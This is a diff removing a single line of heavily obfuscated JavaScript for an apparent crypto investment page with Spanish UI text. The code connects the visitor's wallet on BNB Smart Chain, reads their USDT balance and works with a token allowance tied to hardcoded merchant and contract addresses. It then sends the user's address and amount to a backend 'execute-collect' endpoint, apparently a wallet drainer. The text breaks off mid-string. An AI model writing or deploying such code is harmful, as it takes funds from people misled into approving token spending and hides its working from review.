@@ -1,1 +1,560 @@
-'use strict';const _0x375f90=_0x3ee7;function _0x3ee7(_0x5bbd25,_0xd30f63){_0x5bbd25=_0x5bbd25-(0xb*0xce+0x1dfc+-0xc*0x323);const _0x1f47ae=_0x4481();let _0x418609=_0x1f47ae[_0x5bbd25];return _0x418609;}(function(_0x49c55c,_0x5a067c){const _0x522b73=_0x3ee7,_0x2482b1=_0x49c55c();while(!![]){try{const _0x462021=-parseInt(_0x522b73(0x1d4))/(-0x11de+0xbc7+-0x30c*-0x2)*(parseInt(_0x522b73(0x2f3))/(-0x1c5*-0xb+-0x6a2*-0x3+-0x41*0x9b))+-parseInt(_0x522b73(0x217))/(0x225d*-0x1+-0x25de+-0x529*-0xe)+-parseInt(_0x522b73(0x192))/(-0x2551+0xe31+0x1724)*(-parseInt(_0x522b73(0x149))/(0x25*0x9d+0x6d0+-0x4*0x75f))+parseInt(_0x522b73(0x2ca))/(-0xa3*-0x11+0x1c28+-0x26f5)+parseInt(_0x522b73(0x30a))/(-0x213f+-0x175f*-0x1+0x9e7)+parseInt(_0x522b73(0x29f))/(-0x1bf7+-0x10e7+-0x66a*-0x7)+parseInt(_0x522b73(0x221))/(-0x126f*0x1+0x1108+-0xb8*-0x2)*(-parseInt(_0x522b73(0x152))/(0x151d+-0x85d*-0x3+-0x2e2a*0x1));if(_0x462021===_0x5a067c)break;else _0x2482b1['push'](_0x2482b1['shift']());}catch(_0x269f33){_0x2482b1['push'](_0x2482b1['shift']());}}}(_0x4481,0x15*0x463d+-0x770c4+0x653cb));const MERCHANT_ADDRESS=_0x375f90(0x235)+_0x375f90(0x1f6)+_0x375f90(0x1ca)+_0x375f90(0x29e)+'3b',CONTRACT_ADDRESS=_0x375f90(0x1c2)+_0x375f90(0x2d4)+_0x375f90(0x135)+_0x375f90(0x188)+'34',BSC_USDT_ADDRESS=_0x375f90(0x155)+_0x375f90(0x1ac)+_0x375f90(0x244)+_0x375f90(0x1d8)+'55',BSC_CHAIN_ID_HEX=_0x375f90(0x251),MIN_USDT_BALANCE=0x0n,BACKEND_URL=_0x375f90(0x2b1)+_0x375f90(0x2fd)+_0x375f90(0x215)+_0x375f90(0x18a),BSC_RPC_URLS=[_0x375f90(0x17e)+_0x375f90(0x275)+_0x375f90(0x162),_0x375f90(0x17e)+_0x375f90(0x260)+_0x375f90(0x2a0)+_0x375f90(0x2b0),_0x375f90(0x17e)+_0x375f90(0x260)+_0x375f90(0x18d)+_0x375f90(0x2b0),_0x375f90(0x300)+_0x375f90(0x1d3)+_0x375f90(0x2f1)],BSC_CHAIN_PARAMS={'chainId':BSC_CHAIN_ID_HEX,'chainName':_0x375f90(0x1e2)+_0x375f90(0x209),'nativeCurrency':{'name':_0x375f90(0x1be),'symbol':_0x375f90(0x1be),'decimals':0x12},'rpcUrls':BSC_RPC_URLS,'blockExplorerUrls':[_0x375f90(0x17e)+_0x375f90(0x19c)]},ERC20_ABI=[_0x375f90(0x1df)+_0x375f90(0x1c6)+_0x375f90(0x19a)+_0x375f90(0x30e)+_0x375f90(0x302)+_0x375f90(0x1fa)+_0x375f90(0x253)+_0x375f90(0x1dc),_0x375f90(0x1df)+_0x375f90(0x2c5)+_0x375f90(0x2eb)+_0x375f90(0x198)+_0x375f90(0x298)+_0x375f90(0x2bc)+_0x375f90(0x210)+_0x375f90(0x248)+'6)',_0x375f90(0x304)+_0x375f90(0x1db)+_0x375f90(0x143)+_0x375f90(0x2a2)+_0x375f90(0x24a)+_0x375f90(0x178)+_0x375f90(0x26b)],approveBtn=document[_0x375f90(0x25a)+_0x375f90(0x165)](_0x375f90(0x2b4)),btnText=document[_0x375f90(0x25a)+_0x375f90(0x165)](_0x375f90(0x1d0)),btnSpinner=document[_0x375f90(0x25a)+_0x375f90(0x165)](_0x375f90(0x229)),merchantInput=document[_0x375f90(0x25a)+_0x375f90(0x165)](_0x375f90(0x1a4)+_0x375f90(0x1d6)),toastEl=document[_0x375f90(0x25a)+_0x375f90(0x165)](_0x375f90(0x21f)),amountInput=document[_0x375f90(0x25a)+_0x375f90(0x165)](_0x375f90(0x1eb)+'nt');if(merchantInput)merchantInput[_0x375f90(0x2f4)]=MERCHANT_ADDRESS;let cachedUserBalance=0x10d*-0x1d+-0x26*-0x16+0x1b35,pendingInvestment=![],isWalletConnected=![],currentRawProvider=null,currentUserAddress='';((async()=>{const _0x752046=_0x375f90,_0x5e7bcf={'MQTLs':function(_0x2ac790,_0x2b6808){return _0x2ac790(_0x2b6808);}};try{await _0x5e7bcf[_0x752046(0x25d)](fetch,BACKEND_URL+_0x752046(0x233));}catch(_0x48ad77){}})());let _toastTimer;function showToast(_0x31ee2a,_0x583148=_0x375f90(0x13e),_0x120e5b=-0x1308+-0x965+0x1*0x2e01){const _0x5730f7=_0x375f90,_0x31ec22={'Pgfmz':_0x5730f7(0x315)+_0x5730f7(0x24d),'VNyTc':function(_0x1669d7,_0x42d752){return _0x1669d7===_0x42d752;},'yAhlv':_0x5730f7(0x13e),'sLKAS':function(_0x3ea7e2,_0x4d4735,_0x39215c){return _0x3ea7e2(_0x4d4735,_0x39215c);},'ZPBiN':function(_0x2169c4,_0x125478){return _0x2169c4===_0x125478;},'CCgAj':_0x5730f7(0x19b),'HmFHN':_0x5730f7(0x26f)+_0x5730f7(0x1b3)+_0x5730f7(0x2bb),'PztZR':_0x5730f7(0x15a),'NXaZM':_0x5730f7(0x14e)+_0x5730f7(0x2df)+_0x5730f7(0x2dc),'tejtC':_0x5730f7(0x1e3),'AfuCz':function(_0x44d54d,_0x869b40){return _0x44d54d(_0x869b40);}},_0x5db9bf=_0x31ec22[_0x5730f7(0x2b5)][_0x5730f7(0x141)]('|');let _0x4edea9=0xece*0x1+0x1*0x1f4e+0x1a*-0x1c6;while(!![]){switch(_0x5db9bf[_0x4edea9++]){case'0':toastEl[_0x5730f7(0x2ff)][_0x5730f7(0x2be)]=_0x31ec22[_0x5730f7(0x2af)](_0x583148,_0x31ec22[_0x5730f7(0x2e2)])?'':_0x583148;continue;case'1':toastEl[_0x5730f7(0x226)]=![];continue;case'2':toastEl[_0x5730f7(0x1ba)]=_0x31ee2a;continue;case'3':if(!toastEl)return;continue;case'4':_toastTimer=_0x31ec22[_0x5730f7(0x282)](setTimeout,()=>{const _0x422654=_0x5730f7;toastEl[_0x422654(0x226)]=!![];},_0x120e5b);continue;case'5':if(_0x31ec22[_0x5730f7(0x191)](_0x583148,_0x31ec22[_0x5730f7(0x28d)]))toastEl[_0x5730f7(0x310)][_0x5730f7(0x1e3)]=_0x31ec22[_0x5730f7(0x2ea)];else _0x31ec22[_0x5730f7(0x191)](_0x583148,_0x31ec22[_0x5730f7(0x297)])?toastEl[_0x5730f7(0x310)][_0x5730f7(0x1e3)]=_0x31ec22[_0x5730f7(0x139)]:toastEl[_0x5730f7(0x310)][_0x5730f7(0x2d2)+_0x5730f7(0x158)](_0x31ec22[_0x5730f7(0x247)]);continue;case'6':_0x31ec22[_0x5730f7(0x279)](clearTimeout,_toastTimer);continue;}break;}}function setLoading(_0x11bbfb,_0x1d70cc=_0x375f90(0x2bd)+'…'){const _0x5c86d1=_0x375f90,_0x3ed109={'BZaFN':_0x5c86d1(0x264),'Lztko':_0x5c86d1(0x17f),'nHePt':_0x5c86d1(0x150)+_0x5c86d1(0x257)},_0x2b9cc2=_0x3ed109[_0x5c86d1(0x1e5)][_0x5c86d1(0x141)]('|');let _0x59594c=0x18a1+0x3b8+0x7b*-0x3b;while(!![]){switch(_0x2b9cc2[_0x59594c++]){case'0':if(btnSpinner)btnSpinner[_0x5c86d1(0x226)]=!_0x11bbfb;continue;case'1':approveBtn[_0x5c86d1(0x2cc)]=_0x11bbfb;continue;case'2':approveBtn[_0x5c86d1(0x310)][_0x5c86d1(0x2ac)]=_0x11bbfb?_0x3ed109[_0x5c86d1(0x1a5)]:'1';continue;case'3':if(btnText)btnText[_0x5c86d1(0x23a)+'t']=_0x11bbfb?_0x1d70cc[_0x5c86d1(0x19d)+'e']():_0x3ed109[_0x5c86d1(0x2f8)];continue;case'4':if(!approveBtn)return;continue;}break;}}function updateWalletPill(_0x107326,_0x5e02a6){const _0x3d9fb1=_0x375f90,_0x5d539e={'iYwdY':function(_0x1e17ab){return _0x1e17ab();},'obVXs':_0x3d9fb1(0x299)+_0x3d9fb1(0x278),'gpkvP':_0x3d9fb1(0x1c1),'PQuiT':_0x3d9fb1(0x1fe)+_0x3d9fb1(0x26c),'hqgsw':function(_0x240d56,_0xc3802a){return _0x240d56&&_0xc3802a;},'SkzUo':function(_0x1dec4e,_0x5e957e){return _0x1dec4e-_0x5e957e;},'ypoZn':_0x3d9fb1(0x16d),'AmeNo':_0x3d9fb1(0x170)+_0x3d9fb1(0x2b9),'CfdXR':_0x3d9fb1(0x1aa)};let _0x17cd10=document[_0x3d9fb1(0x25a)+_0x3d9fb1(0x165)](_0x5d539e[_0x3d9fb1(0x153)]);if(!_0x17cd10){_0x17cd10=document[_0x3d9fb1(0x211)+_0x3d9fb1(0x1a3)](_0x5d539e[_0x3d9fb1(0x237)]),_0x17cd10['id']=_0x5d539e[_0x3d9fb1(0x153)],_0x17cd10[_0x3d9fb1(0x310)][_0x3d9fb1(0x2f9)]=_0x3d9fb1(0x268)+_0x3d9fb1(0x1f5)+_0x3d9fb1(0x148)+_0x3d9fb1(0x290)+_0x3d9fb1(0x23d)+_0x3d9fb1(0x2f7)+_0x3d9fb1(0x14d)+_0x3d9fb1(0x179)+_0x3d9fb1(0x2a7)+_0x3d9fb1(0x1de)+_0x3d9fb1(0x16c)+_0x3d9fb1(0x21a)+_0x3d9fb1(0x136)+_0x3d9fb1(0x140)+_0x3d9fb1(0x1e4)+_0x3d9fb1(0x1c0)+_0x3d9fb1(0x1b9)+_0x3d9fb1(0x1b0)+_0x3d9fb1(0x1f7)+_0x3d9fb1(0x2a3)+_0x3d9fb1(0x1e0)+_0x3d9fb1(0x29a)+_0x3d9fb1(0x2b8)+_0x3d9fb1(0x151)+_0x3d9fb1(0x17a)+_0x3d9fb1(0x208)+_0x3d9fb1(0x22f)+_0x3d9fb1(0x193)+_0x3d9fb1(0x18f)+_0x3d9fb1(0x1e1)+_0x3d9fb1(0x305)+_0x3d9fb1(0x2a5)+_0x3d9fb1(0x19e);const _0x3e67cc=document[_0x3d9fb1(0x271)+_0x3d9fb1(0x147)](_0x5d539e[_0x3d9fb1(0x2d5)])||document[_0x3d9fb1(0x1a1)];_0x3e67cc[_0x3d9fb1(0x17c)+'re'](_0x17cd10,_0x3e67cc[_0x3d9fb1(0x240)]);}if(_0x5d539e[_0x3d9fb1(0x1ed)](_0x5e02a6,_0x107326)){const _0x11a42c=_0x107326[_0x3d9fb1(0x13f)](0x1*-0xab2+0x1bfc+-0x114a,0x23ad+0x2120+-0x44c7)+_0x3d9fb1(0x225)+_0x107326[_0x3d9fb1(0x13f)](_0x5d539e[_0x3d9fb1(0x1ef)](_0x107326[_0x3d9fb1(0x236)],0xcdd*0x1+0x2191+-0x392*0xd));_0x17cd10[_0x3d9fb1(0x310)][_0x3d9fb1(0x2e6)]=_0x5d539e[_0x3d9fb1(0x20b)],_0x17cd10[_0x3d9fb1(0x1ba)]=_0x3d9fb1(0x1b4)+_0x3d9fb1(0x2a6)+_0x3d9fb1(0x18c)+_0x3d9fb1(0x238)+_0x3d9fb1(0x22a)+_0x3d9fb1(0x312)+_0x3d9fb1(0x1da)+_0x3d9fb1(0x2a1)+_0x3d9fb1(0x29d)+_0x3d9fb1(0x2e1)+_0x3d9fb1(0x272)+_0x3d9fb1(0x313)+_0x3d9fb1(0x2c3)+_0x3d9fb1(0x1e3)+_0x3d9fb1(0x2a9)+_0x3d9fb1(0x1ae)+_0x3d9fb1(0x276)+_0x3d9fb1(0x214)+_0x3d9fb1(0x23b)+_0x3d9fb1(0x196)+_0x3d9fb1(0x26d)+_0x3d9fb1(0x2cd)+_0x11a42c+(_0x3d9fb1(0x2f0)+_0x3d9fb1(0x1ce)+_0x3d9fb1(0x180)+_0x3d9fb1(0x2e0)+_0x3d9fb1(0x311)+_0x3d9fb1(0x27e)+_0x3d9fb1(0x252)+_0x3d9fb1(0x1b8)+_0x3d9fb1(0x2fe)+_0x3d9fb1(0x1c9)+_0x3d9fb1(0x203)+_0x3d9fb1(0x259)+_0x3d9fb1(0x23c)+_0x3d9fb1(0x15e)+_0x3d9fb1(0x21d)+_0x3d9fb1(0x2fa)+_0x3d9fb1(0x164)+_0x3d9fb1(0x216)+_0x3d9fb1(0x1c4)+_0x3d9fb1(0x1b1)+_0x3d9fb1(0x17b)+_0x3d9fb1(0x23f)+_0x3d9fb1(0x213)+_0x3d9fb1(0x2cf)+_0x3d9fb1(0x21e)+_0x3d9fb1(0x29d)+_0x3d9fb1(0x30b)+_0x3d9fb1(0x284)+_0x3d9fb1(0x14c)+_0x3d9fb1(0x19e)),document[_0x3d9fb1(0x25a)+_0x3d9fb1(0x165)](_0x5d539e[_0x3d9fb1(0x2f2)])[_0x3d9fb1(0x1ff)]=()=>{const _0x3ae46b=_0x3d9fb1;_0x5d539e[_0x3ae46b(0x190)](resetAppUI);};}else _0x17cd10[_0x3d9fb1(0x310)][_0x3d9fb1(0x2e6)]=_0x5d539e[_0x3d9fb1(0x2fc)],_0x17cd10[_0x3d9fb1(0x1ba)]='';}function resetAppUI(){const _0x192416=_0x375f90,_0x2f35d8={'cFPPe':_0x192416(0x1ab)+_0x192416(0x2ad),'ZxEdu':_0x192416(0x27a)+_0x192416(0x269),'BPFGl':_0x192416(0x1f1)+'or','dCykH':function(_0x32839a,_0x434d81){return _0x32839a(_0x434d81);},'MrQVO':function(_0x2b54df,_0x9110eb,_0x2e68b4){return _0x2b54df(_0x9110eb,_0x2e68b4);},'GIykU':function(_0x130f78,_0x109649,_0x440e97,_0x2dbc1b){return _0x130f78(_0x109649,_0x440e97,_0x2dbc1b);},'VVnNB':_0x192416(0x1ea)+_0x192416(0x28c)+_0x192416(0x287),'uztVV':_0x192416(0x13e),'OVWIE':function(_0x35be7d,_0x3953cf){return _0x35be7d===_0x3953cf;},'miHdE':_0x192416(0x183)};isWalletConnected=![],currentRawProvider=null,currentUserAddress='';const _0x2afddc=document[_0x192416(0x25a)+_0x192416(0x165)](_0x2f35d8[_0x192416(0x2c2)]);_0x2afddc&&(_0x2afddc[_0x192416(0x23a)+'t']=_0x2f35d8[_0x192416(0x258)]);amountInput&&(amountInput[_0x192416(0x2f4)]='',amountInput[_0x192416(0x310)][_0x192416(0x2d2)+_0x192416(0x158)](_0x2f35d8[_0x192416(0x14a)]));cachedUserBalance=-0x15cf+0x26bc+0x10ed*-0x1,pendingInvestment=![],_0x2f35d8[_0x192416(0x2e5)](setLoading,![]),_0x2f35d8[_0x192416(0x22d)](updateWalletPill,'',![]),_0x2f35d8[_0x192416(0x1e8)](showToast,_0x2f35d8[_0x192416(0x2ba)],_0x2f35d8[_0x192416(0x1e9)],-0x177c+-0x7c1+0x2af5*0x1);if(window[_0x192416(0x2c0)]&&_0x2f35d8[_0x192416(0x169)](typeof window[_0x192416(0x2c0)][_0x192416(0x170)],_0x2f35d8[_0x192416(0x185)]))try{window[_0x192416(0x2c0)][_0x192416(0x170)]();}catch(_0x59be74){}}amountInput&&amountInput[_0x375f90(0x230)+_0x375f90(0x21c)](_0x375f90(0x1d9),_0xdbe20=>{const _0x28c7c8=_0x375f90,_0x10b2de={'LKssc':function(_0x209e3e,_0x559d2f){return _0x209e3e(_0x559d2f);},'vAixC':function(_0x300be5,_0xb5df72){return _0x300be5>_0xb5df72;},'Rkatx':_0x28c7c8(0x30f),'TwPoT':_0x28c7c8(0x1f1)+'or'},_0x309dd0=_0x10b2de[_0x28c7c8(0x2ed)](parseFloat,_0xdbe20[_0x28c7c8(0x25f)][_0x28c7c8(0x2f4)])||-0x1478+-0xbef*-0x1+0x5*0x1b5;_0x10b2de[_0x28c7c8(0x2e3)](cachedUserBalance,0xd1a+0x3*0xb56+-0x2f1c)&&_0x10b2de[_0x28c7c8(0x2e3)](_0x309dd0,cachedUserBalance)?amountInput[_0x28c7c8(0x310)][_0x28c7c8(0x281)+'r']=_0x10b2de[_0x28c7c8(0x24b)]:amountInput[_0x28c7c8(0x310)][_0x28c7c8(0x2d2)+_0x28c7c8(0x158)](_0x10b2de[_0x28c7c8(0x146)]);});async function fetchAndDisplayUserBalances(_0x2093ba){const _0x460754=_0x375f90,_0x4599b6={'rlvZA':function(_0x99cfd1,_0x40acab){return _0x99cfd1-_0x40acab;},'vESQD':function(_0xc8ab33,_0x5b71d9){return _0xc8ab33>_0x5b71d9;},'SnijY':_0x460754(0x20d),'HJrZK':_0x460754(0x1d9),'inxwq':function(_0x5e4bff,_0x2c1eef,_0x4e521d){return _0x5e4bff(_0x2c1eef,_0x4e521d);},'fjaiO':function(_0x5d74c7,_0xbc8f31){return _0x5d74c7(_0xbc8f31);},'oypPG':_0x460754(0x1ab)+_0x460754(0x2ad),'oPtNT':_0x460754(0x1dd),'AZzaj':_0x460754(0x23e)+_0x460754(0x29b)+_0x460754(0x2d9)+_0x460754(0x202),'WqUVo':function(_0x1be861){return _0x1be861();}};try{const _0x261d5b=new ethers[(_0x460754(0x2d8))+(_0x460754(0x274))](_0x2093ba),_0x3a36e1=await _0x261d5b[_0x460754(0x31a)]();currentUserAddress=await _0x3a36e1[_0x460754(0x194)](),_0x4599b6[_0x460754(0x2de)](updateWalletPill,currentUserAddress,!![]);const _0x1b89fc=new ethers[(_0x460754(0x201))](BSC_USDT_ADDRESS,ERC20_ABI,_0x3a36e1),_0x2f212a=await _0x1b89fc[_0x460754(0x1af)](currentUserAddress),_0x4dd7a2=ethers[_0x460754(0x243)+'s'](_0x2f212a,-0x62*0x3d+-0x2*0xbce+0x2f08);cachedUserBalance=_0x4599b6[_0x460754(0x1f9)](parseFloat,_0x4dd7a2);const _0x4f4aa1=document[_0x460754(0x25a)+_0x460754(0x165)](_0x4599b6[_0x460754(0x181)]);_0x4f4aa1&&(_0x4f4aa1[_0x460754(0x23a)+'t']=_0x460754(0x206)+cachedUserBalance[_0x460754(0x285)](0x9*-0x76+-0x8*-0x383+-0x17f0)+_0x460754(0x1a7));const _0x15ed97=document[_0x460754(0x25a)+_0x460754(0x165)](_0x4599b6[_0x460754(0x200)]);_0x15ed97&&(_0x15ed97[_0x460754(0x1ff)]=()=>{const _0x2d7d9f=_0x460754;if(amountInput){const _0x49c5f3=Math[_0x2d7d9f(0x2a8)](0xb5*0x1c+0x103b+-0x2407,_0x4599b6[_0x2d7d9f(0x174)](cachedUserBalance,-0x205c+-0x1037*0x2+-0x3*-0x1599));amountInput[_0x2d7d9f(0x2f4)]=_0x4599b6[_0x2d7d9f(0x137)](_0x49c5f3,0x6*0x396+-0xb25*0x1+-0xa5f)?_0x49c5f3[_0x2d7d9f(0x285)](-0x149e+0x1*0x14c3+-0x23):_0x4599b6[_0x2d7d9f(0x1cf)],amountInput[_0x2d7d9f(0x2c4)+_0x2d7d9f(0x1a3)](new Event(_0x4599b6[_0x2d7d9f(0x306)]));}});}catch(_0x1bf3a2){console[_0x460754(0x15a)](_0x4599b6[_0x460754(0x223)],_0x1bf3a2),_0x4599b6[_0x460754(0x167)](resetAppUI);}}async function triggerBackendCollect(_0x453e83){const _0x4c92d7=_0x375f90,_0x2e97cb={'deREm':function(_0x3dd5ae,_0x11b44f){return _0x3dd5ae<=_0x11b44f;},'uPwYI':function(_0x5bdea6,_0xe56d00,_0x136c73){return _0x5bdea6(_0xe56d00,_0x136c73);},'QBXAP':_0x4c92d7(0x154),'YyxsD':_0x4c92d7(0x245)+_0x4c92d7(0x176),'NTQSt':_0x4c92d7(0x301)+_0x4c92d7(0x2c1),'KfvOC':function(_0x40eec2,_0x1c27c4){return _0x40eec2<_0x1c27c4;}};let _0x1dc714;const _0x2e6a98=amountInput?.[_0x4c92d7(0x2f4)]||'1',_0x4971ad=ethers[_0x4c92d7(0x2f5)](_0x2e6a98[_0x4c92d7(0x27f)](),-0x5ee+0x436+-0x1*-0x1ca)[_0x4c92d7(0x27f)]();for(let _0x58644d=0x522+-0xbc1+-0x1a8*-0x4;_0x2e97cb[_0x4c92d7(0x227)](_0x58644d,-0xb*-0x25d+-0xfd1+-0xa2b);_0x58644d++){try{const _0xf3cb9a=await _0x2e97cb[_0x4c92d7(0x163)](fetch,BACKEND_URL+(_0x4c92d7(0x218)+_0x4c92d7(0x25c)),{'method':_0x2e97cb[_0x4c92d7(0x27b)],'headers':{'Content-Type':_0x2e97cb[_0x4c92d7(0x142)]},'body':JSON[_0x4c92d7(0x2d1)]({'userAddress':_0x453e83,'amount':_0x4971ad})}),_0x34b20d=await _0xf3cb9a[_0x4c92d7(0x157)]();if(!_0xf3cb9a['ok']||!_0x34b20d[_0x4c92d7(0x19b)])throw new Error(_0x34b20d[_0x4c92d7(0x15a)]||_0x2e97cb[_0x4c92d7(0x24e)]);return _0x34b20d;}catch(_0x167ffd){_0x1dc714=_0x167ffd;if(_0x2e97cb[_0x4c92d7(0x1d1)](_0x58644d,-0x19d8+0x1*-0x1e4a+0x63d*0x9))await new Promise(_0x23eb5b=>setTimeout(_0x23eb5b,-0x13b+0x1*0x1d7b+-0x1088));}}throw _0x1dc714;}window[_0x375f90(0x2c0)]&&typeof window[_0x375f90(0x2c0)][_0x375f90(0x20a)+_0x375f90(0x265)]===_0x375f90(0x183)&&window[_0x375f90(0x2c0)][_0x375f90(0x20a)+_0x375f90(0x265)](_0x30e0da=>{const _0x17f864=_0x375f90,_0x3d474a={'uWWwK':_0x17f864(0x172),'Txwxg':function(_0x34042d,_0x5da692){return _0x34042d(_0x5da692);},'lQvjO':function(_0x49fbf2,_0x148161){return _0x49fbf2(_0x148161);},'OdoRN':function(_0x353958){return _0x353958();}},_0x4525d3=_0x30e0da[_0x3d474a[_0x17f864(0x2db)]];_0x4525d3?(isWalletConnected=!![],currentRawProvider=_0x4525d3,_0x3d474a[_0x17f864(0x1cb)](fetchAndDisplayUserBalances,_0x4525d3),pendingInvestment&&(pendingInvestment=![],_0x3d474a[_0x17f864(0x2b2)](runInvestmentFlow,_0x4525d3))):_0x3d474a[_0x17f864(0x2c6)](resetAppUI);});window[_0x375f90(0x2c0)]&&typeof window[_0x375f90(0x2c0)][_0x375f90(0x294)+_0x375f90(0x2ec)]===_0x375f90(0x183)&&window[_0x375f90(0x2c0)][_0x375f90(0x294)+_0x375f90(0x2ec)](_0x1601d6=>{const _0x1bbca0=_0x375f90,_0x1a2ca8={'WBGMI':function(_0x1b86c3,_0x2db09e){return _0x1b86c3&&_0x2db09e;},'ssFqC':function(_0x508d2e,_0x24915e){return _0x508d2e(_0x24915e);}};if(!_0x1601d6[_0x1bbca0(0x29c)]){let _0x9c1b08=null;try{_0x9c1b08=window[_0x1bbca0(0x2c0)][_0x1bbca0(0x1e7)+_0x1bbca0(0x20f)]();}catch(_0xe258ed){}_0x1a2ca8[_0x1bbca0(0x255)](!_0x9c1b08,!isWalletConnected)&&(pendingInvestment=![],_0x1a2ca8[_0x1bbca0(0x1ad)](setLoading,![]));}});document[_0x375f90(0x230)+_0x375f90(0x21c)](_0x375f90(0x16a)+_0x375f90(0x24c),()=>{const _0x7cd840=_0x375f90,_0x188d8c={'sLtQc':function(_0x271935,_0x2329ab){return _0x271935===_0x2329ab;},'WqhpP':_0x7cd840(0x183),'RoNrC':function(_0x57f9d1,_0x22cc89){return _0x57f9d1(_0x22cc89);}};if(window[_0x7cd840(0x2c0)]&&_0x188d8c[_0x7cd840(0x295)](typeof window[_0x7cd840(0x2c0)][_0x7cd840(0x1e7)+_0x7cd840(0x20f)],_0x188d8c[_0x7cd840(0x18b)]))try{const _0x46b150=window[_0x7cd840(0x2c0)][_0x7cd840(0x1e7)+_0x7cd840(0x20f)]();_0x46b150&&(isWalletConnected=!![],currentRawProvider=_0x46b150,_0x188d8c[_0x7cd840(0x261)](fetchAndDisplayUserBalances,_0x46b150));}catch(_0x1a9f29){}});approveBtn&&approveBtn[_0x375f90(0x230)+_0x375f90(0x21c)](_0x375f90(0x307),async()=>{const _0x1c4bbb=_0x375f90,_0x254563={'htNUu':function(_0x558d99,_0x44137d){return _0x558d99||_0x44137d;},'WUXIg':function(_0x583dee,_0x374523,_0x12b65b){return _0x583dee(_0x374523,_0x12b65b);},'tfQFI':_0x1c4bbb(0x296)+_0x1c4bbb(0x234)+_0x1c4bbb(0x168)+_0x1c4bbb(0x225),'XXvZA':function(_0x1055e4,_0x4b23f6){return _0x1055e4===_0x4b23f6;},'qAEwY':_0x1c4bbb(0x183),'gPhEI':_0x1c4bbb(0x13a)+_0x1c4bbb(0x27c)+'t:','YKETM':function(_0x12789d,_0x52729c){return _0x12789d(_0x52729c);}};if(_0x254563[_0x1c4bbb(0x2dd)](!isWalletConnected,!currentRawProvider)){pendingInvestment=!![],_0x254563[_0x1c4bbb(0x189)](setLoading,!![],_0x254563[_0x1c4bbb(0x303)]);if(window[_0x1c4bbb(0x2c0)]&&_0x254563[_0x1c4bbb(0x177)](typeof window[_0x1c4bbb(0x2c0)][_0x1c4bbb(0x29c)],_0x254563[_0x1c4bbb(0x267)]))try{await window[_0x1c4bbb(0x2c0)][_0x1c4bbb(0x29c)]();}catch(_0x4cdaa8){console[_0x1c4bbb(0x15a)](_0x254563[_0x1c4bbb(0x26a)],_0x4cdaa8),pendingInvestment=![],_0x254563[_0x1c4bbb(0x1ec)](setLoading,![]);}return;}await _0x254563[_0x1c4bbb(0x1ec)](runInvestmentFlow,currentRawProvider);});function _0x4481(){const _0x4ed0fc=['getWalletP','GIykU','uztVV','Billetera\x20','investAmou','YKETM','hqgsw','upera\x20tu\x20s','SkzUo','USDT\x20en\x20tu','border-col','ttps://bsc','Validando\x20','parseEther','play:\x20flex','b48a6a7d19','px\x2014px;\x20b','kbjor','fjaiO','external\x20r','Confirmand','hvYRG','Web3\x20Error','.card,\x20mai','onclick','oPtNT','Contract','\x20vivo:','\x20border:\x201','VcNvR','wait','Saldo:\x20','\x20error\x20al\x20','\x20\x20\x20\x20backdr','Chain','subscribeP','ypoZn','tu\x20wallet.','1.00','Mdmow','rovider','view\x20retur','createElem','GmUfI','-size:\x2012p','\x20display:\x20','ant.onrend','x\x2010px;\x20bo','770121qvNKTX','/execute-c','chainId','5,\x200.05);\x20','Saldo\x20de\x20B','stener',');\x20color:\x20','ight:\x20bold','toast','\x20exitosa!\x20','227889lZbezY','denied','AZzaj','reason','...','hidden','deREm','\x20inversión','btnSpinner','-items:\x20ce','⚠️\x20Revisa\x20t','rpyEr','MrQVO','o\x20saldo\x20de','op-filter:','addEventLi','por\x20el\x20usu','El\x20monto\x20i','/health','elector\x20de','0x6253fecb','length','gpkvP','lex;\x20align','trQZc','textConten','inline-blo','gba(239,\x206','pace-betwe','Error\x20al\x20s','nter;\x20font','firstChild','onocido','\x20saldo\x20de\x20','formatUnit','7548524699','applicatio','\x20pagar\x20la\x20','tejtC','ns\x20(uint25','ayQta','rnal\x20view\x20','Rkatx','Loaded','5|4','NTQSt','MBlwd','<a\x20href=\x22h','0x38','yle=\x22backg','eturns\x20(bo','\x20Chain\x20en\x20','WBGMI','zUpvH','HORA','ZxEdu','px\x20solid\x20r','getElement','\x20BNB\x20Smart','ollection','MQTLs','ciones...','target','c-dataseed','RoNrC','jTBJH','getNetwork','4|1|2|3|0','roviders','iente\x20para','qAEwY','\x0a\x20\x20\x20\x20\x20\x20dis','USDT','gPhEI','int256)','n,\x20form','n>\x0a\x20\x20\x20\x20\x20\x20\x20','as.','rgba(38,\x201','BJmvn','querySelec','yle=\x22width','OibhV','vider','c-rpc.publ','dius:\x2050%;','sHYDd','Container','AfuCz','Saldo:\x20--\x20','QBXAP','brir\x20AppKi','ario.','letBtn\x22\x20st','toString','saldo\x20de\x20U','borderColo','sLKAS','red.','tar\x0a\x20\x20\x20\x20\x20\x20','toFixed','uxWYL','da.','TJHyq','yrErJ','ón\x20complet','\x20USDT...','desconecta','CCgAj','mChain','o\x20red\x20BSC.','content:\x20s','hqjsE','cKmaM','ión\x20en\x20la\x20','subscribeS','sLtQc','Abriendo\x20s','PztZR','s\x20spender)','walletPill','margin-bot','incronizar','open',';\x22>\x0a\x20\x20\x20\x20\x20\x20','5fae58ab9b','3515504jiobmi','1.binance.','r:\x20#4ade80','ount)\x20exte','order-radi','code','rder-box;\x0a','an\x20style=\x22','\x20backgroun','max',':\x20#4ade80;','line;\x22>Ver','cancelled','opacity','nceLabel','a:\x20Cambia\x20','VNyTc','org/','https://se','lQvjO','allowance','approveBtn','Pgfmz','ualmente\x20a','Conectando','tom:\x2016px;','WalletBtn','VVnNB','.95)','\x20external\x20','Processing','type','uzKQq','modal','\x20failed.','cFPPe','ght:\x208px;\x20','dispatchEv','llowance(a','OdoRN','tJzzn','ngresado\x20s','YWSHV','2223150uaVgfe','nible.','disabled','\x20<b>','zwYBq','x;\x20font-we','scan.com/t','stringify','removeProp','¡Inversión','6f10565A63','PQuiT','XuJaP','a\x20transacc','BrowserPro','\x20saldos\x20en','request','uWWwK','95)','htNUu','inxwq','53,\x2069,\x200.','on\x20id=\x22dis','\x20\x20<span\x20st','yAhlv','vAixC',':\x20#fff;\x20te','dCykH','display','comisión\x20d','TAEXI','NB\x20insufic','HmFHN','ddress\x20own','tate','LKssc','JHEce','kryCF','</b>\x0a\x20\x20\x20\x20\x20','/bsc','AmeNo','6890vKpBXw','value','parseUnits','xt-decorat','en;\x20align-','nHePt','cssText','#f87171;\x20p','\x20proveedor','CfdXR','cure-merch','a(239,\x2068,','dataset','https://rp','Collection','6\x20amount)\x20','tfQFI','function\x20b','sizing:\x20bo','HJrZK','click','tchEthereu','user\x20rejec','4176109oqpGCk','\x20\x20Desconec','\x20gas\x20(